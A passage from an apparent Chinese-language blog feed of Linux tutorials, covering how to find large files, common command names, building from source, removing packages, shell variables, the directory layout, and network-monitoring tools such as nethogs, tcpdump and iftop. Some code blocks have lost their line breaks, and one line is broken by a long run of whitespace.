        <content type="html"><![CDATA[<p>在Windows系统中，我们可以使用TreeSize工具查找一些大文件或文件夹，非常的方便高效，在Linux系统中，<br>如何去搜索一些比较大的文件呢？下面我整理了一下在Linux系统中如何查找大文件或文件夹的方法。</p><h1 id="如何查找大文件？"><a href="#如何查找大文件？" class="headerlink" title="如何查找大文件？"></a>如何查找大文件？</h1><p>其实很多时候，你需要了解当前系统下有哪些大文件，比如文件大小超过100M或1G（阀值视具体情况而定）。<br>那么如何把这些大文件搜索出来呢？例如我要搜索当前目录下，超过800M大小的文件<br>如上命令所示，我们仅仅能看到超过800M大小的文件的文件名称，但是对文件的信息（例如，文件大小、文件属性）一无所知，<br>那么能否更详细显示一些文件属性或信息呢如果你还需要对查找结果按照文件大小做一个排序，那么可以使用下面命令</p><pre><code>find . -type f -size +800M  -print0 | xargs -0 du -h | sort -nr</code></pre><h1 id="如何查找Linux下的大目录"><a href="#如何查找Linux下的大目录" class="headerlink" title="如何查找Linux下的大目录"></a>如何查找Linux下的大目录</h1><p>譬如有时候磁盘空间告警了，而你平时又疏于管理、监控文件的增长，那么我需要快速的了解哪些目录变得比较大，<br>那么此时我们可以借助du命令来帮我们解决这个问题。</p><pre><code>du -h --max-depth=1 16K    ./lost+found 33G    ./flash_recovery_area 37G    ./oradata 70G     .</code></pre><p>如果你想知道flash_recovery_area目录下面有哪些大文件夹，那么可以将参数max-depth=2 ，如果你想对搜索出来的结果进行排序，<br>那么可以借助于sort命令。如下所示</p><pre><code>du -h --max-depth=2 | sort -n</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 终端诡异家伙</title>
      <link href="/2024/07/24/nine/"/>
      <url>/2024/07/24/nine/</url>
      
        <content type="html"><![CDATA[<p>这篇文章，我们一起来到 Linux 的诡异的一面……你知道吗？在我们日常使用的 Unix（和 Linux ）及其各种各样的分支系统中，<br>存在着一些诡异的命令或进程，它们让人毛骨悚然，有些确实是有害，但也有些却是有益的。下面就来简单介绍一下这些家伙吧。</p><h1 id="daemon"><a href="#daemon" class="headerlink" title="daemon"></a>daemon</h1><p>daemon 有一个很高大上的中文名字，叫守护进程 。有句话是这么说的，如果 Unix 中没有了守护进程，那么 Unix 就不会是相同的。<br>它很有个性，是一个运行在后台且不受终端控制的进程，其大多数都是随着系统启动而启动，无特殊情况下会一直保持运行直到系统关闭。<br>它的存在为我们用户和系统本身提供有用的服务。常见的有 httpd，mysqld，syslogd 等，一般守护程序名称会以d结尾。</p><h1 id="zombie"><a href="#zombie" class="headerlink" title="zombie"></a>zombie</h1><p>zombie ，僵尸？什么鬼？听着就让人害怕。不过，它在 Linux 中指的是当一个进程被杀死后，其实它并不会马上消失，<br>而是变成了 zombie ，即僵尸进程，然后等待其父进程搜集完它的信息才会被清除。一般这种搜集信息的过程会很快完成，<br>但有时它的父进程很忙，该僵尸进程就会一直呆在我们的系统中。系统运行过程中时不时地会产生一些僵尸进程，我们无法直接杀死它们，<br>因为它们已经死了，我们只能采取别的手段，比如说杀死它的父进程，然后由 init 来回收这个僵尸进程。<br>僵尸进程的出现通常表示产生它的进程除了问题，而且它会消耗资源，要防止它的出现。</p><h1 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h1><p>kill ，一个冷酷无情的单词。顾名思义，kill 是一个用于杀死进程的命令，其使用方法简单粗暴。<br>当你发现一个占用太多内存或者 CPU 资源的进程并造成了负面影响时，建议您可以直接用 kill 干掉它。<br>若你遇到僵尸进程杀不掉？别慌，去找它的父进程吧，按上面提到的方法来处理。</p><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>cat，猫？这又是什么奇怪的东西？Linux中除了僵尸还有猫？其实，cat 命令是 concatenate 的简写，也就是连接的意思，<br>这么解释你就懂了。它的作用是组合文件。另外，你甚至可以用这个方便的命令来查看文件的内容。</p><h1 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h1><p>tail，尾巴。这个怪怪的命令解释起来就比较容易了。当你想要查看文件的最后 n 行时，使用 tail 命令就很方便了。<br>另外，当你想要监控文件时，你也可以用它。比如观察日志文件，tail 命令会显示尾部的内容并且可以实时更新，是不是很厉害呢？</p><h1 id="which"><a href="#which" class="headerlink" title="which"></a>which</h1><p>which，别看了前面几个诡异的命令就和 witch（女巫）搞混了。它不是那种童话中阴森恶毒的女巫，它是 which，<br>是负责打印传递给它的任何命令相关联的文件的位置的家伙。例如，我们想要获取 Python 的位置，我们就可以用 which python ，<br>它就会在你的系统上打印每个版本的 Python 的位置。</p><h1 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h1><p>crypt，地下室，这个命令也很好懂。当你想要保管好自己的东西不被别人知道，放到地下室锁起来是一个很好的办法。<br>crypt 在 Linux 中的含义是加密，现在被称为 mcrypt ，当你想要对文件进行加密而不被别人读取，这个命令会很方便。<br>与大多数 Linux 命令一样，您可以单独使用 crypt ，也可以在系统脚本中使用。</p><h1 id="shred"><a href="#shred" class="headerlink" title="shred"></a>shred</h1><p>shred，切碎。我想你看到这里已经对这些怪异的词语见怪不怪了。它是个非常狠的家伙，作用是粉碎文件。当我们想要删除文件，<br>我们会用 rm 命令，但这是有手段进行恢复的，那我们不想让别人恢复怎么办？没错，sherd 的作用就此。<br>shred 能多次覆盖文件以前占用的空间。所以说，用这个命令一点要做好心理准备，因为神仙难救。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Make 三连</title>
      <link href="/2024/07/24/eight/"/>
      <url>/2024/07/24/eight/</url>
      
        <content type="html"><![CDATA[<p>Unix 开发过程中，经常性的操作是从源码编译安装相应库文件，所以下面三个命令便是家常便饭，俗称三连：</p><pre><code>./configuremakemake install</code></pre><p>下面来看看这三步分别做了什么。</p><h1 id="configure"><a href="#configure" class="headerlink" title="configure"></a>configure</h1><p>执行 ./configure 文件一般是进行正式编译前的一些环境准备，准备编译需要的依赖项等。比如检测当前的系统平台，<br>检测需要的编译器是否存在如何调用，配置和生成相应编译所需文件。</p><h1 id="make"><a href="#make" class="headerlink" title="make"></a>make</h1><p>前期准备工作完成无误后，就可能调用 make 来执行编译了。实际执行的是 Makefile 文件中定义的任务来从源码进行项目的编译。<br>通常情况下下载下来的 tar 包中可能没有包含正式的 Makefile 文件，而是另外形式呈现的临时文件，<br>比如 Makefile.in，Makefile.am,Makefile.MSVC 等，然后在执行 ./configure的时候根据相应环境来生成最终需要的 Makefile 文件。</p><h1 id="make-install"><a href="#make-install" class="headerlink" title="make install"></a>make install</h1><p>项目编译正常后，会生成相应的产出，可执行文件，so 或 o 文件或 DLL 动态链接文件等。最后一步就是将生成的文件复制到相应的系统目录，<br>这个过程便是安装。比如将可执行文件复制到系统 PATH 能取到的地方，帮助文档复制到 MANPATH，其他文件复制到对应目录下。<br>这种默认安装路径的话，会把可执行文件拷贝到/usr/local/bin，如果没有sudo权限的话是会失败的，有两种方法指定安装路径。一种是在./configure的时候指定路径</p><pre><code>./configure --prefix=安装路径make install DESTDIR=安装路径</code></pre><h1 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h1><p>在Linux下直接用pip install packageName，有些文件会被放到根目录下，如果没有sudo权限的话，是会安装失败的。这个以后我们就需要指定安装的目录了。</p><pre><code>pip install --install-option=&quot;--prefix=绝对路径&quot; packageName</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 完全卸载一个软件包</title>
      <link href="/2024/07/23/six/"/>
      <url>/2024/07/23/six/</url>
      
        <content type="html"><![CDATA[<p>今天卸载一个软件，老是有配置残留，网上找到了解决方案：<br>查看已安装的软件：</p><pre><code>dpkg -l |grep 软件名</code></pre><p>找到一大堆相关的包，然后卸载核心的包：</p><pre><code>sudo apt-get remove --purge 软件包名</code></pre><p>继续grep，直到找不到相关的包。<br>最后再来两把：</p><pre><code>sudo apt-get autoremovesudo apt-get clean</code></pre><p>注销一下当前用户再登录 一般就干净了。<br>安装deb：</p><pre><code>sudo dpkg -i xxxxx.deb</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 命令行神器推荐</title>
      <link href="/2024/07/23/five/"/>
      <url>/2024/07/23/five/</url>
      
        <content type="html"><![CDATA[<p>• ag：比grep、ack更快的递归搜索文件内容。<br>• jq: json文件处理以及格式化显示，支持高亮，可以替换python -m json.tool。<br>• ncdu：可视化的空间分析程序<br>你发现有人把 /home 空间撑爆了，影响了大家的工作，你愤怒了一层层的 du，一层层的 cd，<br>整个过程就像刨垃圾堆一样的恶心，后来发现了 ncdu 这个基于 ncurses 的空间分析程序：不但能用光标上下键移动，<br>回车还可以进入对应目录又可以查看最新的占用，很快就揪出了占用空间最大的罪魁祸首。<br>• shellcheck：shell脚本静态检查工具，能够识别语法错误以及不规范的写法。<br>• fzf：命令行下模糊搜索工具，能够交互式智能搜索并选取文件或者内容，配合终端ctrl-r历史命令搜索简直完美。<br>• PathPicker(fpp): 在命令行输出中自动识别目录和文件，支持交互式，配合git非常有用。运行以下命令：</p><pre><code>git diff HEAD~8 --stat | fpp</code></pre><p>• htop: 提供更美观、更方便的进程监控工具，替代top命令。<br>• glances：更强大的 htop / top 代替者。htop 代替 top，glances 代替 htop：<br>信息比 htop 丰富了不少，更全了，对吧？除了命令行查看外，glances 还提供页面服务，让你从页面上随时查看某服务器的状态。<br>• axel：多线程下载工具，下载文件时可以替代curl、wget。</p><pre><code>axel -n 20 http://centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso</code></pre><p>• sz/rz：交互式文件传输，在多重跳板机下传输文件非常好用，不用一级一级传输。<br>• cloc：代码统计工具，能够统计代码的空行数、注释行、编程语言。<br>• tmux：终端复用工具，替代screen、nohup。<br>• script/scriptreplay:  终端会话录制。<br>// 录制</p><pre><code>script -t 2 &gt; time.txt session.typescript// your commands// 录制结束// 回放scriptreplay -t time.txt session.typescriptexit</code></pre><p>• multitail：多重 tail。通常你不止一个日志文件要监控，怎么办？终端软件里开多个 tab 太占地方，可以试试这个工具：</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux shell变量含义</title>
      <link href="/2024/07/23/four/"/>
      <url>/2024/07/23/four/</url>
      
        <content type="html"><![CDATA[<p>$$               Shell本身的PID（ProcessID）<br>$!               Shell最后运行的后台Process的PID<br>$?               最后运行的命令的结束代码（返回值）<br>$-               使用Set命令设定的Flag一览<br>$<em>               所有参数列表。如”$</em>“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。<br>$@               所有参数列表。如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。<br>$#               添加到Shell的参数个数<br>$0               Shell本身的文件名<br>$1～$n           添加到Shell的各参数值。$1是第1参数、$2是第2参数…。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统目录结构</title>
      <link href="/2024/07/20/three/"/>
      <url>/2024/07/20/three/</url>
      
        <content type="html"><![CDATA[<p>/bin  经常使用的指令<br>/boot 启动linux的核心文件<br>/dev  外部设备<br>/etc  系统管理配置文件和子目录<br>/home  自己的目录<br>/lib  共享动态链接库<br>/lost+found  非法关机后存放文件<br>/media   识别的设备的文件<br>/mnt  临时挂载别的文件系统<br>/opt  主机额外安装软件的目录<br>/proc   虚拟的目录，在内存上而不在硬盘上<br>/root  系统管理员<br>/sbin  系统管理员的系统管理程序<br>/srv  存放服务启动之后需要提取的数据<br>/tmp  存放临时文件<br>/usr  用户的很多应用程序和文件<br>/usr/bin  系统用户使用的应用程序<br>/usr/sbin  超级用户使用的管理程序和系统守护程序<br>/usr/src  内核源代码的目录<br>/var  修改的目录的日志文                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        身的文件数据<br>/var/log     日志文件                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 网络工具</title>
      <link href="/2024/06/29/second/"/>
      <url>/2024/06/29/second/</url>
      
        <content type="html"><![CDATA[<p>如果要在你的系统上监控网络，那么使用命令行工具是非常实用的，并且对于 Linux 用户来说，有着许许多多现成的工具可以使用，<br>如： nethogs, ntopng, nload, iftop, iptraf, bmon, slurm,<br>tcptrack, cbm, netwatch, collectl, trafshow, cacti, etherape, ipband, jnettop, netspeed 以及 speedometer。<br>鉴于世上有着许多的 Linux 专家和开发者，显然还存在其他的网络监控工具，但在教程中，<br>我不打算将它们所有包括在内。<br>上面列出的工具都有着自己的独特之处，但归根结底，它们都做着监控网络流量的工作，<br>只是通过各种不同的方法。例如 nethogs 可以被用来展示每个进程的带宽使用情况，<br>以防你想知道究竟是哪个应用在消耗了你的整个网络资源；</p><pre><code>iftop 可以被用来展示每个套接字连接的带宽使用情况，nload 这类的工具可以帮助你得到有关整个带宽的信息。</code></pre><h1 id="nethogs"><a href="#nethogs" class="headerlink" title="nethogs"></a>nethogs</h1><p>nethogs 是一个免费的工具，当要查找哪个 PID (注：即 process identifier，进程 ID) 给你的网络流量带来了麻烦时，它是非常方便的。<br>它按每个进程来分组带宽，而不是像大多数的工具那样按照每个协议或每个子网来划分流量。它功能丰富，同时支持 IPv4 和 IPv6，<br>并且我认为，若你想在你的 Linux 主机上确定哪个程序正消耗着你的全部带宽，它是来做这件事的最佳的程序。<br>一个 Linux 用户可以使用 nethogs 来显示每个进程的 TCP 下载和上传速率，可以使用命令 nethogs eth0 来监控一个指定的设备，<br>上面的 eth0 是那个你想获取信息的设备的名称，你还可以得到有关正在传输的数据的传输速率信息。对我而言， nethogs 是非常容易使用的，<br>或许是因为我非常喜欢它，以至于我总是在我的 Ubuntu 12.04 LTS 机器中使用它来监控我的网络带宽。例如要想使用混杂模式来嗅探，<br>可以像下面展示的命令那样使用选项 -p：</p><pre><code>nethogs -p wlan0</code></pre><p>假如你想更多地了解 nethogs 并深入探索它，那么请毫不犹豫地阅读我们做的关于这个网络带宽监控工具的整个教程。</p><h1 id="nload"><a href="#nload" class="headerlink" title="nload"></a>nload</h1><p>nload 是一个控制台应用，可以被用来实时地监控网络流量和带宽使用情况，它还通过提供两个简单易懂的图表来对流量进行可视化。<br>这个绝妙的网络监控工具还可以在监控过程中切换被监控的设备，而这可以通过按左右箭头来完成。<br>正如你在上面的截图中所看到的那样，由 nload 提供的图表是非常容易理解的。nload 提供了有用的信息，<br>也展示了诸如被传输数据的总量和最小/最大网络速率等信息。而更酷的是你只需要直接运行 nload 这个工具就行，这个命令是非常的短小且易记的：</p><h1 id="slurm"><a href="#slurm" class="headerlink" title="slurm"></a>slurm</h1><p>slurm 是另一个 Linux 网络负载监控工具，它以一个不错的 ASCII 图来显示结果，它还支持许多按键用以交互，例如 c 用来切换到经典模式，<br>s 切换到分图模式， r 用来重绘屏幕， L 用来启用 TX/RX 灯（注：TX，发送流量；RX，接收流量） ，<br>m 用来在经典分图模式和大图模式之间进行切换， q 退出 slurm。在网络负载监控工具 slurm 中，还有许多其它的按键可用，<br>你可以很容易地使用下面的命令在 man 手册中学习它们。</p><pre><code>man slurm</code></pre><p>slurm 在 Ubuntu 和 Debian 的官方软件仓库中可以找到，所以使用这些发行版本的用户可以像下面展示的那样，<br>使用 apt-get 安装命令来轻松地下载它：</p><pre><code>sudo apt-get install slurm</code></pre><p>我们已经在一个教程中对 slurm 的使用做了介绍，不要忘记和其它使用 Linux 的朋友分享这些知识。</p><h1 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h1><p>当你想显示连接到网卡上的各个主机的带宽使用情况时，iftop 是一个非常有用的工具。根据 man 手册，<br>iftop 在一个指定的接口或在它可以找到的第一个接口（假如没有任何特殊情况，它应该是一个对外的接口）上监听网络流量，<br>并且展示出一个表格来显示当前的一对主机间的带宽使用情况。<br>通过在虚拟终端中使用下面的命令，Ubuntu 和 Debian 用户可以在他们的机器中轻易地安装 iftop：</p><pre><code>sudo apt-get install iftop</code></pre><h1 id="collectl"><a href="#collectl" class="headerlink" title="collectl"></a>collectl</h1><p>collectl 可以被用来收集描述当前系统状态的数据，并且它支持如下两种模式：<br>记录模式<br>回放模式<br>记录模式 允许从一个正在运行的系统中读取数据，然后将这些数据要么显示在终端中，要么写入一个或多个文件或一个套接字中。<br>回放模式<br>根据 man 手册，在这种模式下，数据从一个或多个由记录模式生成的数据文件中读取。<br>Ubuntu 和 Debian 用户可以在他们的机器上使用他们默认的包管理器来安装 colletcl。下面的命令将为他们做这个工作：</p><pre><code>sudo apt-get install collectl</code></pre><h1 id="Netstat"><a href="#Netstat" class="headerlink" title="Netstat"></a>Netstat</h1><p>Netstat 是一个用来监控传入和传出的网络数据包统计数据的接口统计数据命令行工具。<br>它会显示 TCP 连接 (包括上传和下行)，路由表，及一系列的网络接口（网卡或者SDN接口）和网络协议统计数据。<br>Ubuntu 和 Debian 用户可以在他们的机器上使用默认的包管理器来安装 netstat。<br>Netstat 软件被包括在 net-tools 软件包中，并可以在 shell 或虚拟终端中运行下面的命令来安装它：</p><pre><code>sudo apt-get install net-toolsnetstat</code></pre><p>更多的关于 netstat 的信息，我们可以简单地在 shell 或终端中键入 man netstat 来了解：<br>man netstat</p><h1 id="Netload"><a href="#Netload" class="headerlink" title="Netload"></a>Netload</h1><p>netload 命令只展示一个关于当前网络荷载和自从程序运行之后传输数据总的字节数目的简要报告，它没有更多的功能。<br>它是 netdiag 软件的一部分。<br>Netload 是默认仓库中 netdiag 的一部分，我们可以轻易地使用下面的命令来利用 apt 包管理器安装 netdiag：</p><pre><code>sudo apt-get install netdiag</code></pre><p>为了运行 netload，我们需要确保选择了一个正在工作的网络接口的名称，<br>如 eth0, eh1, wlan0, mon0等，然后在 shell 或虚拟终端中运行下面的命令：</p><pre><code>netload wlan2</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，<br>可以在一个虚拟终端或 shell 中运行 <code>ip link show</code>命令。</p><h1 id="Nagios"><a href="#Nagios" class="headerlink" title="Nagios"></a>Nagios</h1><p>Nagios 是一个领先且功能强大的开源监控系统，它使得网络或系统管理员可以在服务器的各种问题影响到服务器的主要事务之前，<br>发现并解决这些问题。 有了 Nagios 系统，管理员便可以在一个单一的窗口中监控远程的 Linux 、Windows 系统、交换机、路由器和打印机等。<br>它会显示出重要的警告并指出在你的网络或服务器中是否出现某些故障，这可以间接地帮助你在问题发生前就着手执行补救行动。<br>Nagios 有一个 web 界面，其中有一个图形化的活动监视器。通过浏览网页 <a href="http://localhost/nagios/">http://localhost/nagios/</a> 或 <a href="http://localhost/nagios3/">http://localhost/nagios3/</a> 便可以登录到这个 web 界面。<br>假如你在远程的机器上进行操作，请使用你的 IP 地址来替换 localhost，然后键入用户名和密码，我们便会看到如下图所展示的信息：</p><h1 id="EtherApe"><a href="#EtherApe" class="headerlink" title="EtherApe"></a>EtherApe</h1><p>EtherApe 是一个针对 Unix 的图形化网络监控工具，它仿照了 etherman 软件。它支持链路层、IP 和 TCP 等模式，<br>并支持以太网, FDDI, 令牌环, ISDN, PPP, SLIP 及 WLAN 设备等接口，以及一些封装格式。<br>主机和连接随着流量和协议而改变其尺寸和颜色。它可以过滤要展示的流量，并可从一个文件或运行的网络中读取数据包。<br>我们也可以使用下面的命令在 Ubuntu、Debian 及它们的衍生发行版本中使用 apt 包管理器来安装 EtherApe ：</p><pre><code>sudo apt-get install etherape</code></pre><p>在 EtherApe 安装到你的系统之后，我们需要像下面那样以 root 权限来运行 etherape：</p><pre><code>sudo etherape</code></pre><p>然后， etherape 的 图形用户界面 便会被执行。接着，在菜单上面的 捕捉 选项下，我们可以选择 模式(IP，链路层，TCP) 和 接口。<br>一切设定完毕后，我们需要点击 开始 按钮。接着我们便会看到类似下面截图的东西：</p><h1 id="tcpflow"><a href="#tcpflow" class="headerlink" title="tcpflow"></a>tcpflow</h1><p>tcpflow 是一个命令行工具，它可以捕捉 TCP 连接(流)的部分传输数据，并以一种方便协议分析或除错的方式来存储数据。<br>它重构了实际的数据流并将每个流存储在不同的文件中，以备日后的分析。它能识别 TCP 序列号并可以正确地重构数据流，不管是在重发还是乱序发送状态下。<br>通过 apt 包管理器在 Ubuntu 、Debian 系统中安装 tcpflow 是很容易的，因为默认情况下在官方软件仓库中可以找到它。</p><pre><code>sudo apt-get install tcpflow</code></pre><p>我们可以使用 tcpflow 来捕捉全部或部分 tcp 流量，并以一种简单的方式把它们写到一个可读的文件中。下面的命令就可以完成这个事情，但我们需要在一个空目录中运行下面的命令，因为它将创建诸如 x.x.x.x.y-a.a.a.a.z 格式的文件，运行之后，只需按 Ctrl-C 便可停止这个命令。</p><pre><code>sudo tcpflow -i eth0 port 8000</code></pre><p>注意：请将上面的 eth0 替换为你想捕捉的网卡接口名称</p><h1 id="IPTraf"><a href="#IPTraf" class="headerlink" title="IPTraf"></a>IPTraf</h1><p>IPTraf 是一个针对 Linux 平台的基于控制台的网络统计应用。它生成一系列的图形，如 TCP 连接的包/字节计数、接口信息和活动指示器、<br>TCP/UDP 流量故障以及局域网内设备的包/字节计数。<br>在默认的软件仓库中可以找到 IPTraf，所以我们可以使用下面的命令通过 apt 包管理器轻松地安装 IPTraf：</p><pre><code>sudo apt-get install iptraf</code></pre><p>我们需要以管理员权限来运行 IPTraf，并带有一个有效的网络接口名。这里，我们的网络接口名为 wlan2，所以我们使用 wlan2 来作为参数：</p><pre><code>sudo iptraf wlan2</code></pre><p>开始通常的网络接口统计，键入：</p><pre><code>iptraf -g查看接口 eth0 的详细统计信息，使用：iptraf -d eth0查看接口 eth0 的 TCP 和 UDP 监控信息，使用：iptraf -z eth0查看接口 eth0 的包的大小和数目，使用：iptraf -z eth0</code></pre><p>注意:请将上面的 eth0 替换为你的接口名称。你可以通过运行ip link show命令来检查你的接口。</p><h1 id="Speedometer"><a href="#Speedometer" class="headerlink" title="Speedometer"></a>Speedometer</h1><p>Speedometer 是一个小巧且简单的工具，它只用来绘出一幅包含有通过某个给定端口的上行、下行流量的好看的图。<br>我们可以使用下面的命令通过 apt 包管理器轻松地安装 Speedometer：</p><pre><code>sudo apt-get install speedometerSpeedometer 可以简单地通过在 shell 或虚拟终端中执行下面的命令来运行：speedometer -r wlan2 -t wlan2</code></pre><p>注：请将上面的 wlan2 替换为你想要使用的网络接口名称</p><h1 id="Netwatch"><a href="#Netwatch" class="headerlink" title="Netwatch"></a>Netwatch</h1><p>Netwatch 是 netdiag 工具集里的一部分，它也显示当前主机和其他远程主机的连接情况，以及在每个连接中数据传输的速率。<br>Netwatch 是 netdiag 的一部分，可以在默认的软件仓库中找到，所以我们可以轻松地使用下面的命令来利用 apt 包管理器安装netdiag：</p><pre><code>sudo apt-get install netdiag</code></pre><p>为了运行 netwatch， 我们需要在虚拟终端或 shell 中执行下面的命令：</p><pre><code>sudo netwatch -e wlan2 -nt</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，<br>可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="Trafshow"><a href="#Trafshow" class="headerlink" title="Trafshow"></a>Trafshow</h1><p>Trafshow 同 netwatch 和 pktstat 一样，可以报告当前活动的连接里使用的协议和每个连接中数据传输的速率。<br>它可以使用 pcap 类型的过滤器来筛选出特定的连接。<br>Trafshow 在默认仓库中可以找到，所以我们可以轻松地使用下面的命令来利用 apt 包管理器安装它：</p><pre><code>sudo apt-get install trafshow</code></pre><p>为了使用 trafshow 来执行监控任务，我们需要在虚拟终端或 shell 中执行下面的命令：</p><pre><code>sudo trafshow -i wlan2</code></pre><p>为了专门监控 tcp 连接，如下面一样添加上 tcp 参数：</p><pre><code>sudo trafshow -i wlan2 tcp</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="Vnstat"><a href="#Vnstat" class="headerlink" title="Vnstat"></a>Vnstat</h1><p>与大多数的其他工具相比，Vnstat 有一点不同。实际上它运行着一个后台服务或守护进程，并时刻记录着传输数据的大小。<br>另外，它可以被用来生成一个网络使用历史记录的报告。<br>Vnstat 在默认软件仓库中可以找到，所以我们可以使用下面的命令运行 apt 包管理器来安装它：</p><pre><code>sudo apt-get install vnstat</code></pre><p>不带有任何选项运行 vnstat 将简单地展示出从该守护进程运行后数据传输的总量。</p><pre><code>vnstatvnstat -l</code></pre><p>为实时地监控带宽使用情况，使用 ‘-l’ 选项(live 模式)。然后它将以一种非常精确的方式来展示上行和下行数据所使用的带宽总量，但不会显示任何有关主机连接或进程的内部细节。<br>完成了上面的步骤后，按 Ctrl-C 来停止，这将会得到如下类型的输出</p><h1 id="tcptrack"><a href="#tcptrack" class="headerlink" title="tcptrack"></a>tcptrack</h1><p>tcptrack 可以展示 TCP 连接的状态，它在一个给定的网络端口上进行监听。tcptrack 监控它们的状态并展示出排序且不断更新的列表，<br>包括来源/目标地址、带宽使用情况等信息，这与 top 命令的输出非常类似 。<br>鉴于 tcptrack 在软件仓库中，我们可以轻松地在 Debian、Ubuntu 系统中从软件仓库使用 apt 包管理器来安装 tcptrack。<br>为此，我们需要在 shell 或虚拟终端中执行下面的命令：</p><pre><code>sudo apt-get install tcptrack</code></pre><p>tcptrack 需要以 root 权限或超级用户身份来运行。执行 tcptrack 时，我们需要带上要监视的网络接口 TCP 连接状况的接口名称。这里我们的接口名称为 wlan2，所以如下面这样使用：</p><pre><code>sudo tcptrack -i wlan2</code></pre><p>假如你想监控特定的端口，则使用：</p><pre><code>tcptrack -i wlan2 port 80</code></pre><p>请替换上面的 80 为你想要监控的端口号。注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，<br>假如你想通过扫描了解你的网络接口名称，可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="CBM"><a href="#CBM" class="headerlink" title="CBM"></a>CBM</h1><p>CBM （ Color Bandwidth Meter） 可以展示出当前所有网络设备的流量使用情况。这个程序是如此的简单，<br>以至于都可以从它的名称中看出其功能。CBM 的源代码和新版本可以在 <a href="http://www.isotton.com/utils/cbm/" target="_blank" rel="noopener">http://www.isotton.com/utils/cbm/</a> 上找到。<br>鉴于 CBM 已经包含在软件仓库中，我们可以简单地使用 apt 包管理器从 Debian、Ubuntu 的软件仓库中安装 CBM。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt-get install cbm</code></pre><p>我们只需使用下面展示的命令来在 shell 窗口或虚拟终端中运行 cbm：</p><pre><code>cbm</code></pre><h1 id="bmon"><a href="#bmon" class="headerlink" title="bmon"></a>bmon</h1><p>Bmon （ Bandwidth Monitoring） ，是一个用于调试和实时监控带宽的工具。这个工具能够检索各种输入模块的统计数据。<br>它提供了多种输出方式，包括一个基于 curses 库的界面，轻量级的HTML输出，以及 ASCII 输出格式<br>bmon 可以在软件仓库中找到，所以我们可以通过使用 apt 包管理器来在 Debian、Ubuntu 中安装它。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt-get install bmon</code></pre><p>我们可以使用下面的命令来运行 bmon 以监视我们的网络状态：</p><pre><code>bmon</code></pre><h1 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h1><p>TCPDump 是一个用于网络监控和数据获取的工具。它可以为我们节省很多的时间，并可用来调试网络或服务器的相关问题。<br>它可以打印出在某个网络接口上与布尔表达式相匹配的数据包所包含的内容的一个描述。<br>tcpdump 可以在 Debian、Ubuntu 的默认软件仓库中找到，我们可以简单地以 sudo 权限使用 apt 包管理器来安装它。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt -get install tcpdump</code></pre><p>tcpdump 也可以在 Fedora、CentOS、RHEL 的软件仓库中找到。我们可以像下面一样通过 yum 包管理器来安装它：<br>tcpdump 需要以 root 权限或超级用户来运行，我们需要带上我们想要监控的 TCP 连接的网络接口名称来执行 tcpdump 。在这里，<br>我们有 wlan2 这个网络接口，所以可以像下面这样使用：</p><pre><code>sudo tcpdump -i wlan2</code></pre><p>假如你只想监视一个特定的端口，则可以运行下面的命令。下面是一个针对 80 端口(网络服务器)的例子：</p><pre><code>sudo tcpdump -i wlan2 &#39;port 80&#39;</code></pre><h1 id="ntopng"><a href="#ntopng" class="headerlink" title="ntopng"></a>ntopng</h1><p>ntopng 是 ntop 的下一代版本。它是一个用于展示网络使用情况的网络探头，在一定程度上它与 top 针对进程所做的工作类似。<br>ntopng 